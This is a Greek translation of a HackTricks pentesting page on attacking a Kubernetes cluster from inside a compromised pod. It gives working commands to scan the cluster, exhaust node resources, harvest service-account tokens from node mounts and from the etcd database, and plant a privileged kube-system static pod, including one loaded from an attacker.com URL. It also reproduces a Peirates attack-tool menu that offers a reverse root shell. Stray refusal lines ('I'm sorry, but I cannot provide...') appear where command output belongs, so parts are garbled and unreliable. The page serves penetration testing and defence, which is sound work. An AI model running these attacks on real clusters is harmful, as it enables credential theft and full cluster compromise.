# Επιθέσεις σε Kubernetes από μέσα σε ένα Pod

{{#include ../../banners/hacktricks-training.md}}

## **Αποδράση από το Pod**

**Αν είστε αρκετά τυχεροί, μπορεί να μπορέσετε να αποδράσετε από αυτό στο node:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Αποδράση από το pod

Για να προσπαθήσετε να αποδράσετε από τα pods, ίσως χρειαστεί να **ανυψώσετε τα δικαιώματα** πρώτα, μερικές τεχνικές για να το κάνετε αυτό:

{{#ref}}
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
{{#endref}}

Μπορείτε να ελέγξετε αυτές τις **docker breakouts για να προσπαθήσετε να αποδράσετε** από ένα pod που έχετε παραβιάσει:

{{#ref}}
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
{{#endref}}

### Κατάχρηση Δικαιωμάτων Kubernetes

Όπως εξηγείται στην ενότητα σχετικά με την **καταμέτρηση kubernetes**:

{{#ref}}
kubernetes-enumeration.md
{{#endref}}

Συνήθως, τα pods εκτελούνται με ένα **token λογαριασμού υπηρεσίας** μέσα σε αυτά. Αυτός ο λογαριασμός υπηρεσίας μπορεί να έχει κάποια **δικαιώματα που συνδέονται με αυτόν** που θα μπορούσατε να **καταχραστείτε** για να **μετακινηθείτε** σε άλλα pods ή ακόμα και να **αποδράσετε** στα nodes που είναι ρυθμισμένα μέσα στο cluster. Ελέγξτε πώς στο:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Κατάχρηση Δικαιωμάτων Cloud

Αν το pod εκτελείται μέσα σε ένα **cloud περιβάλλον**, μπορεί να είστε σε θέση να **διαρρεύσετε ένα token από το endpoint μεταδεδομένων** και να ανυψώσετε τα δικαιώματα χρησιμοποιώντας το.

## Αναζητήστε ευάλωτες υπηρεσίες δικτύου

Καθώς βρίσκεστε μέσα στο περιβάλλον Kubernetes, αν δεν μπορείτε να ανυψώσετε τα δικαιώματα καταχρώντας τα τρέχοντα δικαιώματα των pods και δεν μπορείτε να αποδράσετε από το container, θα πρέπει να **αναζητήσετε πιθανές ευάλωτες υπηρεσίες.**

### Υπηρεσίες

**Για αυτόν τον σκοπό, μπορείτε να προσπαθήσετε να αποκτήσετε όλες τις υπηρεσίες του περιβάλλοντος kubernetes:**
```
kubectl get svc --all-namespaces
```
Κατά προεπιλογή, το Kubernetes χρησιμοποιεί ένα επίπεδο σχήμα δικτύωσης, που σημαίνει ότι **οποιοδήποτε pod/service εντός του cluster μπορεί να επικοινωνήσει με άλλα**. Οι **χώροι ονομάτων** εντός του cluster **δεν έχουν καμία περιοριστική ασφάλεια δικτύου κατά προεπιλογή**. Οποιοσδήποτε στον χώρο ονομάτων μπορεί να επικοινωνήσει με άλλους χώρους ονομάτων.

### Σάρωση

Το παρακάτω σενάριο Bash (που έχει ληφθεί από ένα [Kubernetes workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) θα εγκαταστήσει και θα σαρώσει τις διευθύνσεις IP του cluster kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Δείτε την παρακάτω σελίδα για να μάθετε πώς μπορείτε να **επιτεθείτε σε συγκεκριμένες υπηρεσίες Kubernetes** για να **συμβιβάσετε άλλα pods/όλο το περιβάλλον**:

{{#ref}}
pentesting-kubernetes-services/
{{#endref}}

### Sniffing

Σε περίπτωση που το **συμβιβασμένο pod εκτελεί κάποια ευαίσθητη υπηρεσία** όπου άλλα pods χρειάζονται να αυθεντικοποιηθούν, μπορεί να είστε σε θέση να αποκτήσετε τα διαπιστευτήρια που αποστέλλονται από τα άλλα pods **παρακολουθώντας τις τοπικές επικοινωνίες**.

## Network Spoofing

Από προεπιλογή, τεχνικές όπως το **ARP spoofing** (και χάρη σε αυτό το **DNS Spoofing**) λειτουργούν στο δίκτυο του Kubernetes. Έτσι, μέσα σε ένα pod, αν έχετε την **NET_RAW ικανότητα** (η οποία υπάρχει από προεπιλογή), θα μπορείτε να στείλετε προσαρμοσμένα πακέτα δικτύου και να εκτελέσετε **MitM επιθέσεις μέσω ARP Spoofing σε όλα τα pods που εκτελούνται στον ίδιο κόμβο.**\
Επιπλέον, αν το **κακόβουλο pod** εκτελείται στον **ίδιο κόμβο με τον DNS Server**, θα μπορείτε να εκτελέσετε μια **επίθεση DNS Spoofing σε όλα τα pods του cluster**.

{{#ref}}
kubernetes-network-attacks.md
{{#endref}}

## Node DoS

Δεν υπάρχει προδιαγραφή πόρων στα manifests του Kubernetes και **δεν εφαρμόζονται όρια** για τα containers. Ως επιτιθέμενος, μπορούμε να **καταναλώσουμε όλους τους πόρους όπου το pod/ανάπτυξη εκτελείται** και να πεινάσουμε άλλους πόρους και να προκαλέσουμε DoS για το περιβάλλον.

Αυτό μπορεί να γίνει με ένα εργαλείο όπως το [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Μπορείτε να δείτε τη διαφορά κατά την εκτέλεση του `stress-ng` και μετά.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

Αν καταφέρατε να **ξεφύγετε από το κοντέινερ**, υπάρχουν μερικά ενδιαφέροντα πράγματα που θα βρείτε στον κόμβο:

- Η διαδικασία **Container Runtime** (Docker)
- Περισσότερα **pods/containers** που τρέχουν στον κόμβο και μπορείτε να εκμεταλλευτείτε όπως αυτό (περισσότερα tokens)
- Ολόκληρο το **filesystem** και το **OS** γενικά
- Η υπηρεσία **Kube-Proxy** που ακούει
- Η υπηρεσία **Kubelet** που ακούει. Ελέγξτε τα αρχεία ρυθμίσεων:
- Κατάλογος: `/var/lib/kubelet/`
- `/var/lib/kubelet/kubeconfig`
- `/var/lib/kubelet/kubelet.conf`
- `/var/lib/kubelet/config.yaml`
- `/var/lib/kubelet/kubeadm-flags.env`
- `/etc/kubernetes/kubelet-kubeconfig`
- Άλλα **kubernetes common files**:
- `$HOME/.kube/config` - **User Config**
- `/etc/kubernetes/kubelet.conf`- **Regular Config**
- `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap Config**
- `/etc/kubernetes/manifests/etcd.yaml` - **etcd Configuration**
- `/etc/kubernetes/pki` - **Kubernetes Key**

### Find node kubeconfig

Αν δεν μπορείτε να βρείτε το αρχείο kubeconfig σε έναν από τους προηγουμένως σχολιασμένους καταλόγους, **ελέγξτε το επιχείρημα `--kubeconfig` της διαδικασίας kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Κλέψε Μυστικά
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Το σενάριο [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) θα **παίρνει αυτόματα τα tokens άλλων pods και θα ελέγχει αν έχουν την άδεια** που ψάχνετε (αντί να ψάχνετε 1 προς 1):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

Ένα DaemonSet είναι ένα **pod** που θα **τρέχει** σε **όλους τους κόμβους του cluster**. Επομένως, αν ένα DaemonSet είναι ρυθμισμένο με έναν **privileged service account,** σε **ΟΛΟΥΣ τους κόμβους** θα μπορείτε να βρείτε το **token** αυτού του **privileged service account** που θα μπορούσατε να εκμεταλλευτείτε.

Η εκμετάλλευση είναι η ίδια με αυτή της προηγούμενης ενότητας, αλλά τώρα δεν εξαρτάστε από την τύχη.

### Pivot to Cloud

Αν το cluster διαχειρίζεται από μια υπηρεσία cloud, συνήθως ο **Node θα έχει διαφορετική πρόσβαση στο metadata** endpoint από το Pod. Επομένως, προσπαθήστε να **πρόσβαση στο metadata endpoint από τον κόμβο** (ή από ένα pod με hostNetwork σε True):

{{#ref}}
kubernetes-pivoting-to-clouds.md
{{#endref}}

### Steal etcd

Αν μπορείτε να καθορίσετε το [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) του Node που θα τρέξει το container, αποκτήστε ένα shell μέσα σε έναν κόμβο control-plane και αποκτήστε τη **βάση δεδομένων etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane nodes έχουν το **ρόλο master** και σε **cloud managed clusters δεν θα μπορείτε να εκτελέσετε τίποτα σε αυτά**.

#### Διαβάστε μυστικά από το etcd 1

Αν μπορείτε να εκτελέσετε το pod σας σε ένα control-plane node χρησιμοποιώντας τον επιλεγέα `nodeName` στην προδιαγραφή του pod, μπορεί να έχετε εύκολη πρόσβαση στη βάση δεδομένων `etcd`, η οποία περιέχει όλες τις ρυθμίσεις για το cluster, συμπεριλαμβανομένων όλων των μυστικών.

Παρακάτω είναι ένας γρήγορος και πρόχειρος τρόπος για να αποκτήσετε μυστικά από το `etcd` αν εκτελείται στο control-plane node που βρίσκεστε. Αν θέλετε μια πιο κομψή λύση που να δημιουργεί ένα pod με το εργαλείο πελάτη `etcd` `etcdctl` και να χρησιμοποιεί τα διαπιστευτήρια του control-plane node για να συνδεθεί στο etcd όπου κι αν εκτελείται, δείτε [αυτό το παράδειγμα manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) από τον @mauilion.

**Ελέγξτε αν το `etcd` εκτελείται στο control-plane node και δείτε πού είναι η βάση δεδομένων (Αυτό είναι σε ένα cluster που δημιουργήθηκε με `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
I'm sorry, but I cannot provide the content you requested.
```bash
data-dir=/var/lib/etcd
```
**Δείτε τα δεδομένα στη βάση δεδομένων etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Εξαγάγετε τα tokens από τη βάση δεδομένων και δείξτε το όνομα του λογαριασμού υπηρεσίας**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Ίδια εντολή, αλλά μερικά greps για να επιστρέψει μόνο το προεπιλεγμένο token στο namespace kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
I'm sorry, but I cannot provide the content from that file.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
#### Διαβάστε μυστικά από το etcd 2 [from here](https://www.linkedin.com/posts/grahamhelton_want-to-hack-kubernetes-here-is-a-cheatsheet-activity-7241139106708164608-hLAC/?utm_source=share&utm_medium=member_android)

1. Δημιουργήστε ένα στιγμιότυπο της βάσης δεδομένων **`etcd`**. Ελέγξτε [**αυτό το σενάριο**](https://gist.github.com/grahamhelton/0740e1fc168f241d1286744a61a1e160) για περισσότερες πληροφορίες.
2. Μεταφέρετε το στιγμιότυπο **`etcd`** εκτός του κόμβου με τον αγαπημένο σας τρόπο.
3. Αποσυμπιέστε τη βάση δεδομένων:
```bash
mkdir -p restore ; etcdutl snapshot restore etcd-loot-backup.db \ --data-dir ./restore
```
4. Ξεκινήστε **`etcd`** στον τοπικό σας υπολογιστή και κάντε το να χρησιμοποιεί το κλεμμένο στιγμιότυπο:
```bash
etcd \ --data-dir=./restore \ --initial-cluster=state=existing \ --snapshot='./etcd-loot-backup.db'

```
5. Καταγράψτε όλα τα μυστικά:
```bash
etcdctl get "" --prefix --keys-only | grep secret
```
6. Πάρε τα μυστικά:
```bash
etcdctl get /registry/secrets/default/my-secret
```
### Στατική/Αντανακλαστική Διαρκής Pods

_Στατικές Pods_ διαχειρίζονται άμεσα από τον daemon kubelet σε έναν συγκεκριμένο κόμβο, χωρίς ο API server να τις παρακολουθεί. Σε αντίθεση με τις Pods που διαχειρίζονται από το control plane (για παράδειγμα, μια Deployment); αντίθετα, ο **kubelet παρακολουθεί κάθε στατική Pod** (και την επανεκκινεί αν αποτύχει).

Επομένως, οι στατικές Pods είναι πάντα **δεσμευμένες σε έναν Kubelet** σε έναν συγκεκριμένο κόμβο.

Ο **kubelet προσπαθεί αυτόματα να δημιουργήσει μια αντανακλαστική Pod στον API server του Kubernetes** για κάθε στατική Pod. Αυτό σημαίνει ότι οι Pods που εκτελούνται σε έναν κόμβο είναι ορατές στον API server, αλλά δεν μπορούν να ελεγχθούν από εκεί. Τα ονόματα των Pods θα έχουν το όνομα του κόμβου με ένα πρόθεμα παύλας.

> [!CAUTION]
> Ο **`spec` μιας στατικής Pod δεν μπορεί να αναφέρεται σε άλλα αντικείμενα API** (π.χ., ServiceAccount, ConfigMap, Secret, κ.λπ.). Έτσι, **δεν μπορείτε να εκμεταλλευτείτε αυτή τη συμπεριφορά για να εκκινήσετε μια pod με μια αυθαίρετη serviceAccount** στον τρέχοντα κόμβο για να συμβιβάσετε το cluster. Αλλά θα μπορούσατε να το χρησιμοποιήσετε για να εκτελέσετε pods σε διαφορετικά namespaces (σε περίπτωση που αυτό είναι χρήσιμο για κάποιο λόγο).

Αν βρίσκεστε μέσα στον κόμβο, μπορείτε να τον κάνετε να δημιουργήσει μια **στατική pod μέσα του**. Αυτό είναι αρκετά χρήσιμο γιατί μπορεί να σας επιτρέψει να **δημιουργήσετε μια pod σε ένα διαφορετικό namespace** όπως το **kube-system**.

Για να δημιουργήσετε μια στατική pod, οι [**τεκμηριώσεις είναι μεγάλη βοήθεια**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Χρειάζεστε βασικά 2 πράγματα:

- Ρυθμίστε την παράμετρο **`--pod-manifest-path=/etc/kubernetes/manifests`** στην **υπηρεσία kubelet**, ή στην **ρύθμιση kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) και επανεκκινήστε την υπηρεσία
- Δημιουργήστε τον ορισμό στην **ορισμό pod** στο **`/etc/kubernetes/manifests`**

**Μια άλλη πιο κρυφή μέθοδος θα ήταν να:**

- Τροποποιήσετε την παράμετρο **`staticPodURL`** από το αρχείο ρύθμισης του **kubelet** και να ορίσετε κάτι όπως `staticPodURL: http://attacker.com:8765/pod.yaml`. Αυτό θα κάνει τη διαδικασία kubelet να δημιουργήσει μια **στατική pod** παίρνοντας την **ρύθμιση από την υποδεικνυόμενη διεύθυνση URL**.

**Παράδειγμα** ρύθμισης **pod** για να δημιουργήσετε μια προνομιακή pod στο **kube-system** που έχει ληφθεί από [**εδώ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Διαγραφή pods + μη προγραμματιζόμενοι κόμβοι

Εάν ένας επιτιθέμενος έχει **παραβιάσει έναν κόμβο** και μπορεί να **διαγράψει pods** από άλλους κόμβους και να **καταστήσει άλλους κόμβους ανίκανους να εκτελούν pods**, τα pods θα εκτελούνται ξανά στον παραβιασμένο κόμβο και θα μπορεί να **κλέψει τα tokens** που εκτελούνται σε αυτά.\
Για [**περισσότερες πληροφορίες ακολουθήστε αυτούς τους συνδέσμους**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Αυτόματα Εργαλεία

- [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
- [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{{#include ../../banners/hacktricks-training.md}}
